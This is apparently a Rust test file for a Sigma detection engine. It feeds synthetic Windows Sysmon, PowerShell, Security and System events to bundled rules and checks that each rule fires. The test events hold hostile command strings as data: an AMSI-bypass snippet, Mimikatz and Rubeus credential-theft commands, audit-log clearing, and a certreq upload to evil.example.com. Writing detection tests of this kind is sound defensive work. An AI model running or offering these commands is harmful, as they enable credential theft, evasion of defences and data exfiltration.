//! T8 parity harness (deterministic core).
//!
//! Proves the bundled, XOR-encoded SigmaHQ rule set (rules/sigma/, pinned per
//! ADR-0003) loads and fires correctly against synthetic EventRecords that stand in
//! for the EVTX-ATTACK-SAMPLES techniques. This is the committed, network-free parity
//! signal; the full corpus pull + Hayabusa throughput comparison is the environment-
//! dependent half (see docs/perf-harness.md, run when a corpus + Hayabusa are present).
//!
//! Each case: an event crafted to match exactly one bundled rule fires that rule (by
//! id), carries a non-empty author (DRL 1.1, golden rule 5), and a benign event of the
//! same category fires nothing.

use cairn_core::record::EventRecord;
use cairn_sigma::engine::Engine;
use cairn_sigma::SigmaMatcher;
use chrono::Utc;
use serde_json::json;
use std::path::PathBuf;

/// The bundled, XOR-encoded rule directory (committed at workspace root). Loaded with
/// plain=false. CARGO_MANIFEST_DIR is this crate, so the workspace root is ../../.
fn bundled_rules_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma")
}

/// A Sysmon process_creation (EID 1) EventRecord with the given fields.
fn proc_creation(fields: serde_json::Value) -> EventRecord {
    let serde_json::Value::Object(map) = fields else {
        panic!("fields must be a JSON object");
    };
    EventRecord {
        ts: Utc::now(),
        channel: "Microsoft-Windows-Sysmon/Operational".into(),
        event_id: 1,
        provider: "Microsoft-Windows-Sysmon".into(),
        computer: "WS01".into(),
        record_id: 1,
        data: map,
    }
}

/// A PowerShell script block logging (EID 4104) EventRecord with the given fields.
fn ps_script(fields: serde_json::Value) -> EventRecord {
    let serde_json::Value::Object(map) = fields else {
        panic!("fields must be a JSON object");
    };
    EventRecord {
        ts: Utc::now(),
        channel: "Microsoft-Windows-PowerShell/Operational".into(),
        event_id: 4104,
        provider: "Microsoft-Windows-PowerShell".into(),
        computer: "WS01".into(),
        record_id: 1,
        data: map,
    }
}

/// A Security-channel (service: security) EventRecord with the given EventID and fields.
/// `EventID` is also injected into `data` since Sigma rules under `service: security`
/// match `EventID` as a regular event field, not via `EventRecord::event_id`.
fn security_event(event_id: u32, fields: serde_json::Value) -> EventRecord {
    let serde_json::Value::Object(mut map) = fields else {
        panic!("fields must be a JSON object");
    };
    map.insert("EventID".into(), serde_json::json!(event_id));
    EventRecord {
        ts: Utc::now(),
        channel: "Security".into(),
        event_id,
        provider: "Microsoft-Windows-Security-Auditing".into(),
        computer: "WS01".into(),
        record_id: 1,
        data: map,
    }
}

/// A System-channel (service: system) EventRecord with the given EventID and fields.
/// `EventID` is also injected into `data` since Sigma rules under `service: system`
/// match `EventID` as a regular event field, not via `EventRecord::event_id`.
fn system_event(event_id: u32, fields: serde_json::Value) -> EventRecord {
    let serde_json::Value::Object(mut map) = fields else {
        panic!("fields must be a JSON object");
    };
    map.insert("EventID".into(), serde_json::json!(event_id));
    EventRecord {
        ts: Utc::now(),
        channel: "System".into(),
        event_id,
        provider: "Service Control Manager".into(),
        computer: "WS01".into(),
        record_id: 1,
        data: map,
    }
}

/// Load the bundled encoded rules once.
fn load_bundled() -> Engine {
    let mut engine = Engine::default();
    let n = engine
        .load(&bundled_rules_dir(), false)
        .expect("bundled rules load (decode)");
    assert!(n >= 3, "expected >= 3 bundled rules, loaded {n}");
    engine
}

/// HH.EXE opening a .chm fires rule 68c8acb4 (T1218.001) with an author.
#[test]
fn hh_chm_execution_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\hh.exe",
        "OriginalFileName": "HH.exe",
        "CommandLine": r"hh.exe C:\Users\victim\AppData\Local\Temp\evil.chm"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("68c8acb4-1b60-4890-8e82-3ddf7a6dba84"))
        .expect("HH.EXE rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// msxsl.exe execution fires rule 9e50a8b3 (T1220).
#[test]
fn msxsl_execution_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Users\victim\Desktop\msxsl.exe",
        "CommandLine": r"msxsl.exe customers.xml script.xsl"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0")),
        "msxsl rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

/// mshta.exe with a polyglot-looking extension fires rule cc7abbd0 (T1218.005).
#[test]
fn mshta_suspicious_extension_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\mshta.exe",
        "CommandLine": r"mshta.exe C:\Users\victim\Downloads\invoice.png"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("cc7abbd0-762b-41e3-8a26-57ad50d2eea3")),
        "mshta rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

/// Malicious PowerShell keyword (Mimikatz) fires rule f62176f3 (T1059.001).
#[test]
fn powershell_malicious_keywords_fires() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "Invoke-ReflectivePEInjection using Mimikatz internals"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("f62176f3-8128-4faa-bf6c-83261322e5eb")),
        "malicious PowerShell keyword rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
    assert!(
        hits.iter()
            .all(|h| h.rule_author.as_deref().is_some_and(|a| !a.is_empty())),
        "DRL 1.1: author must be present on every fired rule"
    );
}

/// AMSI bypass assembly-reflection pattern fires rule e0d6c087 (T1685) — requires ALL
/// three fragments per detection.selection (ScriptBlockText|contains|all).
#[test]
fn powershell_amsi_bypass_pattern_fires() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $f=$a.GetField('amsiInitFailed','NonPublic,Static'); $f.SetValue($null,$true)"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("e0d6c087-2d1c-47fd-8799-3904103c5a98")),
        "AMSI bypass pattern rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

/// Disabling PSReadline command history fires rule 602f5669 (T1070.003) — requires
/// BOTH 'Remove-Module' and 'psreadline' (ScriptBlockText|contains|all).
#[test]
fn powershell_disable_psreadline_history_fires() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "Remove-Module psreadline -Force"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("602f5669-6927-4688-84db-0d4b7afb2150")),
        "disable psreadline history rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

/// Local user creation via PowerShell fires rule 243de76f (T1136.001).
#[test]
fn powershell_create_local_user_fires() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "New-LocalUser -Name 'svc-backup' -Password $securePass"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("243de76f-4725-4f2e-8225-a8a69b15ad61")),
        "create local user rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

/// Invoke-Mimikatz style credential dumping fires rule 189e3b02 (T1003) — condition is
/// "1 of selection*"; this event satisfies selection_2 (sekurlsa::logonpasswords).
#[test]
fn powershell_invoke_mimikatz_keyword_fires() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("189e3b02-82b2-4b90-9662-411eb64486d4")),
        "expected Invoke-Mimikatz script block rule to fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
    assert!(
        hits.iter()
            .all(|h| h.rule_author.as_deref().is_some_and(|a| !a.is_empty())),
        "DRL 1.1: author must be present on every fired rule"
    );
}

/// Clearing PowerShell history fires rule 26b692dc (T1070.003) — condition is
/// "1 of selection_* or all of selection1*"; this satisfies selection_2 (all three
/// fragments: Set-PSReadlineOption, the en-dash '–HistorySaveStyle', SaveNothing).
#[test]
fn powershell_clear_history_fires() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "Set-PSReadlineOption –HistorySaveStyle SaveNothing"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("26b692dc-1722-49b2-b496-a8258aa6371d")),
        "clear PowerShell history rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

/// Rubeus hacktool execution via script block fires rule 3245cd30 (T1558.003).
#[test]
fn powershell_rubeus_keyword_fires() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "Invoke-Rubeus -Command 'kerberoast /outfile:hashes.txt'"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("3245cd30-e015-40ff-a31d-5cadd5f377ec")),
        "Rubeus keyword rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

/// COM object download cradle usage fires rule 3c7d1587 (T1105) — condition is
/// "all of selection_*": requires GetTypeFromCLSID( AND one of the listed CLSIDs.
#[test]
fn powershell_com_download_cradle_fires() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "$o=[Type]::GetTypeFromCLSID('0002DF01-0000-0000-C000-000000000046'); [Activator]::CreateInstance($o)"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.iter()
            .any(|f| f.rule_id.as_deref() == Some("3c7d1587-3b13-439f-9941-7d14313dbdfe")),
        "COM download cradle rule should fire; got {:?}",
        hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
    );
}

/// A benign PowerShell script block fires none of the bundled PowerShell rules.
#[test]
fn benign_powershell_script_fires_nothing() {
    let engine = load_bundled();
    let ev = ps_script(json!({
        "ScriptBlockText": "Get-Process | Where-Object { $_.CPU -gt 100 }"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.is_empty(),
        "benign PowerShell script should not fire any rule, got {:?}",
        hits.iter().map(|f| &f.title).collect::<Vec<_>>()
    );
}

/// A benign process_creation (notepad opening a .txt) fires none of the bundled rules
/// — the parity set has no false positives on obviously-benign activity.
#[test]
fn benign_process_creation_fires_nothing() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\notepad.exe",
        "OriginalFileName": "NOTEPAD.EXE",
        "CommandLine": r"notepad.exe C:\Users\victim\Documents\notes.txt"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.is_empty(),
        "benign event should not fire any bundled rule; got {:?}",
        hits.iter().map(|f| &f.title).collect::<Vec<_>>()
    );
}

// ============================================================
// Authentication / logon abuse (service: security)
// ============================================================

/// Kerberoasting Activity - Initial Query (d04ae2b8): a successful (Status 0x0) TGS
/// request (EventID 4769) with RC4 ticket encryption (0x17) for a non-krbtgt,
/// non-machine service account fires.
#[test]
fn kerberoasting_activity_fires() {
    let engine = load_bundled();
    let ev = security_event(
        4769,
        json!({
            "Status": "0x0",
            "TicketEncryptionType": "0x17",
            "ServiceName": "svc-sql",
            "TargetUserName": "attacker@CORP.LOCAL"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("d04ae2b8-ad54-4de0-bd87-4bc1da66aa59"))
        .expect("Kerberoasting Activity rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Potential AS-REP Roasting (3e2f1b2c): a TGT request (EventID 4768) for krbtgt with
/// RC4 encryption (0x17) and pre-authentication disabled (PreAuthType 0) fires.
#[test]
fn asrep_roasting_fires() {
    let engine = load_bundled();
    let ev = security_event(
        4768,
        json!({
            "TicketEncryptionType": "0x17",
            "ServiceName": "krbtgt",
            "PreAuthType": 0
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("3e2f1b2c-4d5e-11ee-be56-0242ac120002"))
        .expect("AS-REP Roasting rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Access To ADMIN$ Network Share (098d7118): a file-share access event (EventID 5140)
/// to ShareName Admin$ from a non-machine account (SubjectUserName not ending in $) fires.
#[test]
fn admin_share_access_fires() {
    let engine = load_bundled();
    let ev = security_event(
        5140,
        json!({
            "ShareName": "Admin$",
            "SubjectUserName": "attacker"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("098d7118-55bc-4912-a836-dc6483a8d150"))
        .expect("ADMIN$ share access rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Possible Impacket SecretDump Remote Activity (252902e3): detailed-file-share access
/// (EventID 5145) to \\*\ADMIN$ writing a SYSTEM32\...tmp file fires.
#[test]
fn impacket_secretdump_fires() {
    let engine = load_bundled();
    let ev = security_event(
        5145,
        json!({
            "ShareName": r"\\*\ADMIN$",
            "RelativeTargetName": r"SYSTEM32\abcdef12.tmp"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("252902e3-5830-4cf6-bf21-c22083dfd5cf"))
        .expect("Impacket SecretDump rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Hidden Local User Creation (7b449a5e): local user creation (EventID 4720) with a
/// TargetUserName ending in $ (and not the legitimate HomeGroupUser$) fires.
#[test]
fn hidden_user_creation_fires() {
    let engine = load_bundled();
    let ev = security_event(
        4720,
        json!({
            "TargetUserName": "svc-backup$"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("7b449a5e-1db5-4dd0-a2dc-4e3a67282538"))
        .expect("Hidden Local User Creation rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// LSASS Access From Non System Account (962fe167): a process access event (EventID
/// 4656) targeting lsass.exe with a known-malicious AccessMask (0x1fffff-style full
/// access), from a non-machine, non-AV/EDR process, fires.
#[test]
fn lsass_access_non_system_account_fires() {
    let engine = load_bundled();
    let ev = security_event(
        4656,
        json!({
            "AccessMask": "0x1f0fff",
            "ObjectType": "Process",
            "ObjectName": r"C:\Windows\System32\lsass.exe",
            "SubjectUserName": "attacker",
            "ProcessName": r"C:\Users\attacker\Downloads\mimikatz.exe"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("962fe167-e48d-4fd6-9974-11e5b9a5d6d1"))
        .expect("LSASS Access From Non System Account rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// A benign successful interactive logon (EventID 4624) fires none of the new
/// authentication rules.
#[test]
fn benign_logon_event_fires_nothing() {
    let engine = load_bundled();
    let ev = security_event(
        4624,
        json!({
            "TargetUserName": "alice",
            "LogonType": "2"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.is_empty(),
        "benign interactive logon should not fire, got {hits:?}"
    );
}

// ============================================================
// Service installation (service: system, EventID 7045)
// ============================================================

/// HackTool Service Registration or Execution (d26ce60c): condition is
/// "selection_eid and 1 of selection_service_*". EventID 7045 (or 7036) from the
/// Service Control Manager provider, plus a ServiceName containing a known
/// credential-dumping tool name (gsecdump), fires.
#[test]
fn hacktool_service_install_fires() {
    let engine = load_bundled();
    let ev = system_event(
        7045,
        json!({
            "Provider_Name": "Service Control Manager",
            "ServiceName": "gsecdump-svc"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("d26ce60c-2151-403c-9a42-49420d87b5e4"))
        .expect("HackTool Service Registration rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Suspicious Service Installation (1d61f71d): EventID 7045 from the Service Control
/// Manager provider with an ImagePath containing a PowerShell obfuscation flag
/// (' -w hidden ') fires.
#[test]
fn suspicious_service_install_fires() {
    let engine = load_bundled();
    let ev = system_event(
        7045,
        json!({
            "Provider_Name": "Service Control Manager",
            "ImagePath": r"C:\Windows\System32\cmd.exe /c powershell.exe -w hidden -enc BASE64PAYLOAD"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("1d61f71d-59d2-479e-9562-4ff5f4ead16b"))
        .expect("Suspicious Service Installation rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Uncommon Service Installation Image Path (26481afe): condition is "selection and
/// ( suspicious_paths or all of suspicious_encoded_* ) and not 1 of filter_*". EventID
/// 7045 with an ImagePath referencing a named pipe (\\.\pipe) satisfies the
/// suspicious_paths branch.
#[test]
fn uncommon_service_install_path_fires() {
    let engine = load_bundled();
    let ev = system_event(
        7045,
        json!({
            "Provider_Name": "Service Control Manager",
            "ImagePath": r"\\.\pipe\evil_pipe_service"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("26481afe-db26-4228-b264-25a29fe6efc7"))
        .expect("Uncommon Service Installation Image Path rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// KrbRelayUp Service Installation (e97d9903): EventID 7045 with ServiceName exactly
/// 'KrbSCM' fires.
#[test]
fn krbrelayup_service_install_fires() {
    let engine = load_bundled();
    let ev = system_event(
        7045,
        json!({
            "ServiceName": "KrbSCM"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("e97d9903-53b2-41fc-8cb9-889ed4093e80"))
        .expect("KrbRelayUp Service Installation rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// A benign service installation (legitimate app updater, plain Program Files path,
/// ordinary ServiceName) fires none of the new service-installation rules.
#[test]
fn benign_service_install_fires_nothing() {
    let engine = load_bundled();
    let ev = system_event(
        7045,
        json!({
            "Provider_Name": "Service Control Manager",
            "ServiceName": "MyAppUpdater",
            "ImagePath": r"C:\Program Files\MyApp\updater.exe"
        }),
    );
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.is_empty(),
        "benign service install should not fire, got {hits:?}"
    );
}

// ============================================================
// Additional process_creation coverage (LOLBAS / persistence / evasion)
// ============================================================

/// Certutil Base64/Hex Decoding (cc9cbe82): condition is "all of selection_*" —
/// requires certutil.exe AND a CommandLine containing '-decode ' or '-decodehex '.
#[test]
fn certutil_decode_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\certutil.exe",
        "OriginalFileName": "CertUtil.exe",
        "CommandLine": r"certutil.exe -decode C:\Users\victim\payload.b64 C:\Users\victim\payload.exe"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7"))
        .expect("Certutil decode rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Tor Browser/Client Execution (62f7c9bf): condition is "selection" (1 of the three
/// alternatives) — this event matches Image ending in '\tor.exe'.
#[test]
fn tor_browser_execution_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Users\victim\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("62f7c9bf-9135-49b2-8aeb-1e54a6ecc13c"))
        .expect("Tor Browser execution rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Cloudflared Tunnel Execution (9a019ffc): condition is "selection" — CommandLine
/// must contain both ' tunnel ' and ' run ' (contains|all) plus one of the
/// credential/config flags.
#[test]
fn cloudflared_tunnel_run_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Users\victim\Downloads\cloudflared.exe",
        "CommandLine": r"cloudflared.exe tunnel run --token eyJhIjoiZXZpbCJ9"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("9a019ffc-3580-4c9d-8d87-079f7e8d3fd4"))
        .expect("Cloudflared tunnel run rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// 7-Zip Password-Protected Compression for Exfiltration (9fbf5927): condition is
/// "all of selection_*" — requires 7z.exe image, a password flag (' -p'), and an
/// archive action (' a ' add or ' u ' update).
#[test]
fn sevenzip_password_compression_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Program Files\7-Zip\7z.exe",
        "OriginalFileName": "7z.exe",
        "CommandLine": r"7z.exe a -pS3cr3t! archive.7z C:\Users\victim\Documents"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("9fbf5927-5261-4284-a71d-f681029ea574"))
        .expect("7-Zip password compression rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Monitoring For Persistence Via BITS (b9cbbc17): condition is "selection_img and
/// (all of selection_cli_notify_* or all of selection_cli_add_*)" — this event
/// satisfies the notify branch: /SetNotifyCmdLine plus cmd.exe.
#[test]
fn bitsadmin_persistence_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\bitsadmin.exe",
        "CommandLine": r"bitsadmin.exe /SetNotifyCmdLine myjob cmd.exe /c evil.bat"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("b9cbbc17-d00d-4e3d-a827-b06d03d2380d"))
        .expect("BITS persistence rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// AMSI Registry Tampering (7dbbcac2): condition is "selection_key and (all of
/// selection_powershell_* or all of selection_reg_*)" — this event satisfies the
/// PowerShell branch: pwsh/powershell image + Set-ItemProperty, targeting the
/// Windows Script Settings AmsiEnable key.
#[test]
fn amsi_registry_tampering_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "OriginalFileName": "PowerShell.EXE",
        "CommandLine": r"powershell.exe Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name AmsiEnable -Value 0"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("7dbbcac2-57a0-45ac-b306-ff30a8bd2981"))
        .expect("AMSI registry tampering rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Audit Policy Tampering Via Auditpol (0a13e132): condition is "all of selection_*"
/// — requires auditpol.exe image and a CommandLine containing 'disable', 'clear',
/// 'remove', or 'restore'.
#[test]
fn auditpol_tampering_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\auditpol.exe",
        "OriginalFileName": "AUDITPOL.EXE",
        "CommandLine": r"auditpol.exe /clear /y"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("0a13e132-651d-11eb-ae93-0242ac130002"))
        .expect("Auditpol tampering rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Interactive AT Job (60fc936d): condition is "selection" — requires Image ending
/// in '\at.exe' AND CommandLine containing 'interactive'.
#[test]
fn at_interactive_execution_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\at.exe",
        "CommandLine": r"at.exe 14:00 /interactive cmd.exe"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("60fc936d-2eb0-4543-8a13-911c750a1dfc"))
        .expect("Interactive AT job rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Windows EventLog Autologger Session Registry Modification (d7b81144): condition is
/// "all of selection_*" — requires reg/powershell image, an add/set action, the
/// Autologger base path, and a Start/Enabled key reference.
#[test]
fn autologger_registry_modification_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\reg.exe",
        "OriginalFileName": "reg.exe",
        "CommandLine": r"reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application /v Start /t REG_DWORD /d 0 /f"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("d7b81144-b866-48a4-9bcc-275dc69d870e"))
        .expect("Autologger registry modification rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Potential Binary Proxy Execution Via Cdb.EXE (b5c7395f): condition is "all of
/// selection*" — requires cdb.exe image and a CommandLine containing ' -c ' or
/// ' -cf ' (debugger script flags).
#[test]
fn cdb_arbitrary_command_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Users\victim\Downloads\cdb.exe",
        "OriginalFileName": "CDB.Exe",
        "CommandLine": r"cdb.exe -c evil.script -p 1234"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("b5c7395f-e501-4a08-94d4-57fe7a9da9d2"))
        .expect("Cdb arbitrary command execution rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Adplus.EXE Abuse (2f869d59): condition is "all of selection_*" — requires
/// adplus.exe image and a CommandLine containing a memory-dump/config/command flag
/// (' -hang ' here).
#[test]
fn adplus_memory_dump_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Tools\adplus.exe",
        "OriginalFileName": "Adplus.exe",
        "CommandLine": r"adplus.exe -hang -pn lsass.exe -o C:\Temp"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("2f869d59-7f6a-4931-992c-cce556ff2d53"))
        .expect("Adplus memory dump rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// Suspicious CertReq Command to Download (4480827a): condition is "all of
/// selection_*" — requires certreq.exe image, a -Post flag, a -config flag, and
/// 'http' in the CommandLine.
#[test]
fn certreq_download_fires() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\certreq.exe",
        "OriginalFileName": "CertReq.exe",
        "CommandLine": r"certreq.exe -Post -config http://evil.example.com/cert C:\Users\victim\payload.exe"
    }));
    let hits = engine.match_event(&ev).unwrap();
    let hit = hits
        .iter()
        .find(|f| f.rule_id.as_deref() == Some("4480827a-9799-4232-b2c4-ccc6c4e9e12b"))
        .expect("Certreq download rule should fire");
    assert!(
        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
        "DRL 1.1: author must be present"
    );
}

/// A benign process_creation event (notepad opening a batch script that happens to
/// exist under a normal path) fires none of the new process_creation rules added in
/// this batch.
#[test]
fn benign_process_creation_extra_batch_fires_nothing() {
    let engine = load_bundled();
    let ev = proc_creation(json!({
        "Image": r"C:\Windows\System32\notepad.exe",
        "CommandLine": r"notepad.exe C:\Users\alice\notes.txt"
    }));
    let hits = engine.match_event(&ev).unwrap();
    assert!(
        hits.is_empty(),
        "benign notepad launch should not fire, got {hits:?}"
    );
}
